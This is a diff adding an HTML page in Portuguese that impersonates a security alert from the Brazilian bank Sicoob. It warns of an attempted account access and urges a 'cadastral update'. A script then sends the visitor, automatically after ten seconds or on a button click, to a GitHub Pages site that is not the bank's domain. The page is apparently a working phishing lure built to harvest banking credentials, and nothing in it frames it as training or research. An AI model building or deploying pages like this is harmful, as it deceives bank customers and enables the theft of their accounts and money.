@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sicoob - Aviso de Tentativa de Acesso</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #006747; /* Fundo verde do Sicoob */
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        .container h1 {
+            color: #006747;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .message {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .alert {
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            background-color: #006747;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .btn:hover {
+            background-color: #004b32;
+        }
+
+        .redirect-msg {
+            font-size: 16px;
+            margin-top: 20px;
+        }
+
+        .header img {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://logovtor.com/wp-content/uploads/2020/04/sicoob-vector-logo.png" alt="Logo Sicoob">
+        </div>
+        <h1>Alerta de Segurança - Sicoob</h1>
+        <div class="alert">
+            <strong>Aviso:</strong> Detectamos uma tentativa de acesso à sua conta.
+        </div>
+        <div class="message">
+            Para garantir a segurança de seus dados, você será redirecionado para a <strong>atualização cadastral</strong> em breve.
+        </div>
+        <div class="redirect-msg">
+            Caso não tenha sido você a tentar acessar, entre em contato com o suporte imediatamente.
+        </div>
+        <button class="btn" onclick="redirectToUpdate()">Atualizar Cadastro</button>
+    </div>
+
+    <script>
+        function redirectToUpdate() {
+            // Redireciona para o link de atualização cadastral (substitua pelo URL correto)
+            window.location.href = "https://sicoobcadastral.github.io/sicoob/";
+        }
+
+        // Redireciona automaticamente após 10 segundos
+        setTimeout(redirectToUpdate, 10000);
+    </script>
+</body>
+</html>
